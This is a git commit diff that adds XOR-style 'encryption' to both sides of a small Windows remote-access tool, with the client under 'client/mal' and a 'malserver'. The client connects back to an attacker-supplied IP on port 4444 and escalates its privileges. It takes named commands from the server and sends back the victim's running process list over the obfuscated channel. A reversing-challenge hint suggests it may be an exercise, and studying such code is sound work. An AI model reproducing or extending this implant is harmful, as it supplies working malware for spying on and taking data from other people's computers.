181b3fe2de5277b8baf4d519086662ebb0b55853
Duc Phan <ducphanduy.agentp@gmail.com>
2019-04-17 23:29:55 -0400

    Add encryption on both sides

--- client/mal/mal/Source.cpp
+++ client/mal/mal/Source.cpp
@@ -3,50 +3,146 @@
 #include <stdio.h>
 #include <tchar.h>
 #include <psapi.h>
-#include <vector>
-#include <stack>
-#include <queue>
 #include <stdlib.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <vector>
+#include <stack>
+#include <queue>
+#include <iostream>
+#include <fstream>
+#include <string>
 
 #define DEFAULT_BUFLEN 1024
 #define DEFAULT_PORT "4444"
 #define MAX_PROCS 1024
 
 typedef std::vector<int> vi;
-typedef std::pair<int, int> pii;
-typedef std::vector<pii> vii;
 
 char *commands[5] = {"GiveMeProcesses", "DownloadMyFile", "UploadThisFile", "GiveMeInfo", "Yeet"};
 char recvbuf[DEFAULT_BUFLEN];
 SOCKET ourSock;
+bool visited[DEFAULT_BUFLEN];
+int maxDepth = 0;
+char *NotKey = "MuchReversingButThisIsNotTheKeyHeheMuchReversingButThisIsNotTheKeyHehe";
+char *KeyFile = "graph.txt";
+std::string dataToSend;
+int idx = 0;
+std::vector<vi> G;
 
-int WeSendData(char *data, SOCKET sock) {
-	int iResult = send(sock, data, (int)strlen(data), 0);
+void WeInitGraph() {
+	std::ifstream inp(KeyFile);
+	std::string line;
+	while (std::getline(inp, line)) {
+		vi gu = vi();
+		for (unsigned int i = 0; i < line.length(); i++) {
+			if (line[i] == '1') {
+				gu.push_back(i);
+			}
+		}
+		G.push_back(gu);
+	}
+}
+
+void WeDFS(int u, char *data, int stop) {
+	if (idx + 1 >= stop) {
+		return;
+	}
+
+	if (visited[u]) {
+		return;
+	}
+
+	idx += 1;
+	data[idx] ^= NotKey[u % strlen(NotKey)];
+	visited[u] = true;
+	for (unsigned int i = 0; i < G[u].size(); i++) {
+		int v = G[u][i];
+		if (visited[v]) {
+			continue;
+		}
+		
+		WeDFS(v, data, stop);
+	}
+}
+
+void WeEncryptOrWeDecrypt(char *data, int length) {
+	int nBytesProcessed = 0;
+	char *ptr = data;
+	while (nBytesProcessed < length) {
+		memset(visited, 0, sizeof(visited));
+		idx = -1;
+		WeDFS(0, ptr, length - nBytesProcessed);
+		if (idx == -1) {
+			puts("\nDone DEncrypting");
+		} else {
+			ptr += idx + 1;
+			nBytesProcessed += idx + 1;
+		}
+	}
+	puts("\nDone DEncrypting");
+}
+
+int WeSendData(std::string data, SOCKET sock) {
+	int allocLen = max(DEFAULT_BUFLEN, data.length() + 1);
+	printf("Data length: %d\n", data.length());
+	char *cdata = (char *)malloc(allocLen);
+	memcpy(cdata, data.c_str(), data.length());
+	cdata[data.length()] = 0;
+	WeEncryptOrWeDecrypt(cdata, data.length());
+	send(sock, "yeeted", strlen("yeeted"), 0);
+	int iResult = send(sock, cdata, data.length(), 0);
 	if (iResult == SOCKET_ERROR) {
 		printf("send failed with error: %x\n", WSAGetLastError());
 		closesocket(sock);
 		WSACleanup();
 		return 1;
 	}
+	memset(cdata, 0, allocLen);
+	strcpy(cdata, "yeeted");
+	send(sock, cdata, allocLen, 0);
+	free(cdata);
 	return iResult;
 }
 
-void WeRecvData(char *data, SOCKET sock) {
-	int iResult;
-	do {
-		memset(data, 0, DEFAULT_BUFLEN);
-		iResult = recv(sock, data, DEFAULT_BUFLEN - 1, 0);
+int WeRecvData(char *&cdata, SOCKET sock) {
+	std::string yeet = "";
+	bool isYeeted = false;
+
+	while (true) {
+		memset(recvbuf, 0, sizeof(recvbuf));
+		int iResult = recv(ourSock, recvbuf, DEFAULT_BUFLEN - 1, 0);
+
 		if (iResult > 0) {
-			printf("We got: %s\n", data);
-			break;
+			yeet += std::string(recvbuf, iResult);
+			int yeetidx = yeet.find("yeeted");
+			if (yeetidx != -1) {
+				if (isYeeted)  {
+					yeet.erase(yeetidx);
+					break;
+				}
+				else {
+					yeet.erase(0, yeetidx + strlen("yeeted"));
+					isYeeted = true;
+				}
+			}
 		}
-		else if (iResult == 0)
-			printf("Connection closed\n");
-		else
-			printf("recv failed with error: %x\n", WSAGetLastError());
-	} while (iResult > 0);
+		else if (iResult == 0) {
+			printf("Connection closing...\n");
+		}
+		else  {
+			printf("recv failed with error: %d\n", WSAGetLastError());
+			closesocket(ourSock);
+			WSACleanup();
+			exit(1);
+		}
+	}
+
+	printf("Yeet length: %d\n", yeet.length());
+	cdata = (char *)malloc(yeet.length() + 1);
+	memcpy(cdata, yeet.c_str(), yeet.length());
+	WeEncryptOrWeDecrypt(cdata, yeet.length());
+	cdata[yeet.length()] = 0;
 }
 
 int WeInitSocket(char *ipaddr, SOCKET *sock) {
@@ -78,6 +174,9 @@ int WeInitSocket(char *ipaddr, SOCKET *sock) {
 		return 1;
 	}
 
+	char *sndbuf = "\0\0\0\0";
+	setsockopt(ConnectSocket, SOL_SOCKET, SO_SNDBUF, sndbuf, 4);
+
 	iResult = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
 	if (iResult == SOCKET_ERROR) {
 		closesocket(ConnectSocket);
@@ -98,6 +197,7 @@ int WeInitSocket(char *ipaddr, SOCKET *sock) {
 int WeShutdownSocket(SOCKET sock) {
 	closesocket(sock);
 	WSACleanup();
+	return 0;
 }
 
 void WeGetOneProcess(DWORD processID) {
@@ -124,9 +224,8 @@ void WeGetOneProcess(DWORD processID) {
 		printf("OpenProcess failed: %x\n", GetLastError());
 	}
 	
-	sprintf(data, "%s  (PID: %u)\n", szProcessName, processID);
-	WeSendData(data, ourSock);
-
+	sprintf_s(data, "%s  (PID: %u)\n", szProcessName, processID);
+	dataToSend += std::string(data);
 	CloseHandle(hProcess);
 }
 
@@ -148,6 +247,7 @@ void WeGetPriv() {
 }
 
 int WeGetProcesses(void) {
+	dataToSend = "";
 	DWORD aProcesses[MAX_PROCS], cbNeeded, cProcesses;
 
 	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
@@ -162,22 +262,26 @@ int WeGetProcesses(void) {
 			WeGetOneProcess(aProcesses[i]);
 		}
 	}
-
+	
+	WeSendData(dataToSend, ourSock);
 	return 0;
 }
 
 int main(int argc, char **argv) {
 
+	WeInitGraph();
 	WeInitSocket(argv[1], &ourSock);
 	WeGetPriv();
 
 	while (true) {
-		WeRecvData(recvbuf, ourSock);
-		if (!strncmp(recvbuf, commands[0], strlen(commands[0]))) {
+		char *cmd;
+		WeRecvData(cmd, ourSock);
+		puts(cmd);
+		if (!strncmp(cmd, commands[0], strlen(commands[0]))) {
 			WeGetProcesses();
 		} else {
-			printf("yeet!");
+			printf("yeet!\n");
+			WeSendData(std::string("yeeted"), ourSock);
 		}
-		Sleep(5000);
 	}
 }
---
+++ server/malserver/malserver/Source.cpp
@@ -0,0 +1,253 @@
+#define WIN32_LEAN_AND_MEAN
+#undef UNICODE
+
+#include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <vector>
+#include <stack>
+#include <queue>
+#include <iostream>
+#include <fstream>
+#include <string>
+#define _CRT_SECURE_NO_WARNINGS
+
+#define DEFAULT_BUFLEN 1024
+#define DEFAULT_PORT "4444"
+
+typedef std::vector<int> vi;
+
+bool visited[DEFAULT_BUFLEN];
+int maxDepth = 0;
+char *NotKey = "MuchReversingButThisIsNotTheKeyHeheMuchReversingButThisIsNotTheKeyHehe";
+char *KeyFile = "graph.txt";
+int idx = 0;
+SOCKET ourSock;
+std::vector<vi> G;
+
+void WeInitGraph() {
+	std::ifstream inp(KeyFile);
+	std::string line;
+	while (std::getline(inp, line)) {
+		vi gu = vi();
+		for (unsigned int i = 0; i < line.length(); i++) {
+			if (line[i] == '1') {
+				gu.push_back(i);
+			}
+		}
+		G.push_back(gu);
+	}
+}
+
+void WeDFS(int u, char *data, int stop) {
+	if (idx + 1 >= stop) {
+		return;
+	}
+
+	if (visited[u]) {
+		return;
+	}
+
+	idx += 1;
+	data[idx] ^= NotKey[u % strlen(NotKey)];
+	visited[u] = true;
+	for (unsigned int i = 0; i < G[u].size(); i++) {
+		int v = G[u][i];
+		if (visited[v]) {
+			continue;
+		}
+		WeDFS(v, data, stop);
+	}
+}
+
+void WeEncryptOrWeDecrypt(char *data, int length) {
+	int nBytesProcessed = 0;
+	char *ptr = data;
+	while (nBytesProcessed < length) {
+		memset(visited, 0, sizeof(visited));
+		idx = -1;
+		WeDFS(0, ptr, length - nBytesProcessed);
+		if (idx == -1) {
+			puts("\nDone DEncrypting");
+		}
+		else {
+			ptr += idx + 1;
+			nBytesProcessed += idx + 1;
+		}
+	}
+	puts("\nDone DEncrypting");
+}
+
+int WeInitSocket() {
+	WSADATA wsaData;
+	SOCKET ListenSocket = INVALID_SOCKET;
+	SOCKET ClientSocket = INVALID_SOCKET;
+	struct addrinfo *result = NULL;
+	struct addrinfo hints;
+
+	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	if (iResult != 0) {
+		printf("WSAStartup failed with error: %d\n", iResult);
+		return 1;
+	}
+
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_INET;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+	hints.ai_flags = AI_PASSIVE;
+
+	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
+	if (iResult != 0) {
+		printf("getaddrinfo failed with error: %x\n", iResult);
+		WSACleanup();
+		return 1;
+	}
+
+	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+	
+	char *sndbuf = '\0\0\0\0';
+	setsockopt(ListenSocket, SOL_SOCKET, SO_SNDBUF, sndbuf, 4);
+
+	if (ListenSocket == INVALID_SOCKET) {
+		printf("socket failed with error: %x\n", WSAGetLastError());
+		freeaddrinfo(result);
+		WSACleanup();
+		return 1;
+	}
+
+	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
+	if (iResult == SOCKET_ERROR) {
+		printf("bind failed with error: %x\n", WSAGetLastError());
+		freeaddrinfo(result);
+		closesocket(ListenSocket);
+		WSACleanup();
+		return 1;
+	}
+
+	freeaddrinfo(result);
+
+	iResult = listen(ListenSocket, SOMAXCONN);
+	if (iResult == SOCKET_ERROR) {
+		printf("listen failed with error: %x\n", WSAGetLastError());
+		closesocket(ListenSocket);
+		WSACleanup();
+		return 1;
+	}
+
+	ClientSocket = accept(ListenSocket, NULL, NULL);
+	if (ClientSocket == INVALID_SOCKET) {
+		printf("accept failed with error: %x\n", WSAGetLastError());
+		closesocket(ListenSocket);
+		WSACleanup();
+		return 1;
+	}
+
+	closesocket(ListenSocket);
+	ourSock = ClientSocket;
+}
+
+int WeShutdownSocket() {
+	int iResult = shutdown(ourSock, SD_SEND);
+	if (iResult == SOCKET_ERROR) {
+		printf("shutdown failed with error: %d\n", WSAGetLastError());
+		closesocket(ourSock);
+		WSACleanup();
+		return 1;
+	}
+
+	closesocket(ourSock);
+	WSACleanup();
+}
+
+int WeSendData(std::string data, SOCKET sock) {
+	int allocLen = max(DEFAULT_BUFLEN, data.length() + 1);
+	printf("Data length: %d\n", data.length());
+	char *cdata = (char *)malloc(allocLen);
+	memcpy(cdata, data.c_str(), data.length());
+	cdata[data.length()] = 0;
+	WeEncryptOrWeDecrypt(cdata, data.length());
+	send(sock, "yeeted", strlen("yeeted"), 0);
+	int iResult = send(sock, cdata, data.length(), 0);
+	if (iResult == SOCKET_ERROR) {
+		printf("send failed with error: %x\n", WSAGetLastError());
+		closesocket(sock);
+		WSACleanup();
+		return 1;
+	}
+	memset(cdata, 0, allocLen);
+	strcpy(cdata, "yeeted");
+	send(sock, cdata, allocLen, 0);
+	free(cdata);
+	return iResult;
+}
+
+int WeRecvData(char *&cdata, SOCKET sock) {
+	char recvbuf[DEFAULT_BUFLEN];
+	std::string yeet = "";
+	bool isYeeted = false;
+
+	while (true) {
+		memset(recvbuf, 0, sizeof(recvbuf));
+		int iResult = recv(ourSock, recvbuf, DEFAULT_BUFLEN - 1, 0);
+
+		if (iResult > 0) {
+			yeet += std::string(recvbuf, iResult);
+			int yeetidx = yeet.find("yeeted");
+			if (yeetidx != -1) {
+				if (isYeeted)  {
+					yeet.erase(yeetidx);
+					break;
+				}
+				else {
+					yeet.erase(0, yeetidx + strlen("yeeted"));
+					isYeeted = true;
+				}
+			}
+		}
+		else if (iResult == 0) {
+			printf("Connection closing...\n");
+		}
+		else  {
+			printf("recv failed with error: %d\n", WSAGetLastError());
+			closesocket(ourSock);
+			WSACleanup();
+			return 1;
+		}
+	}
+
+	printf("Yeet length: %d\n", yeet.length());
+	cdata = (char *)malloc(yeet.length() + 1);
+	memcpy(cdata, yeet.c_str(), yeet.length());
+	WeEncryptOrWeDecrypt(cdata, yeet.length());
+	cdata[yeet.length()] = 0;
+}
+
+int main(int argc, char **argv) {
+	WeInitGraph();
+	WeInitSocket();
+
+	int iResult;
+	int iSendResult;
+	char recvbuf[DEFAULT_BUFLEN];
+	int recvbuflen = DEFAULT_BUFLEN;
+	char inp[DEFAULT_BUFLEN];
+
+	while (true) {
+		printf("Command: ");
+		memset(inp, 0, sizeof(inp));
+
+		scanf("%s", inp);
+		WeSendData(std::string(inp), ourSock);
+		char *data;
+		WeRecvData(data, ourSock);
+		puts(data);
+		free(data);
+	}
+
+	
+	WeShutdownSocket();
+	return 0;
+}
